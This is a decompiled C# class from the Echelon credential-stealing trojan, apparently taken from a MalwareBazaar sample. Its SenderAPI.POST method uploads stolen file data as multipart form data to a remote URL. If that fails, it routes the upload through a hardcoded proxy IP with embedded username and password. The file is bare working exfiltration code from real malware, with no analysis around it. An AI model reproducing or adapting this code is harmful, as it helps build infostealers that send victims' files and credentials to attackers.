// Decompiled with JetBrains decompiler
// Type: Echelon.SenderAPI
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.Net;
using System.Threading;

namespace Echelon
{
  public class SenderAPI
  {
    public static void POST(byte[] file, string filename, string contentType, string url)
    {
      Thread.Sleep(new Random(Environment.TickCount).Next(500, 2000));
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
        WebClient webClient = new WebClient()
        {
          Proxy = (IWebProxy) null
        };
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = webClient.Encoding.GetString(file);
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) filename, (object) contentType, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(url, nameof (POST), bytes);
      }
      catch
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
        using (WebClient webClient = new WebClient())
        {
          string str3 = "------------------------" + DateTime.Now.Ticks.ToString("x");
          webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str3);
          string str4 = webClient.Encoding.GetString(file);
          string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str3, (object) filename, (object) contentType, (object) str4);
          byte[] bytes = webClient.Encoding.GetBytes(s);
          WebProxy webProxy = new WebProxy("168.235.103.57", 3128)
          {
            Credentials = (ICredentials) new NetworkCredential("echelon", "002700z002700")
          };
          webClient.Proxy = (IWebProxy) webProxy;
          webClient.UploadData(url, nameof (POST), bytes);
        }
      }
    }
  }
}
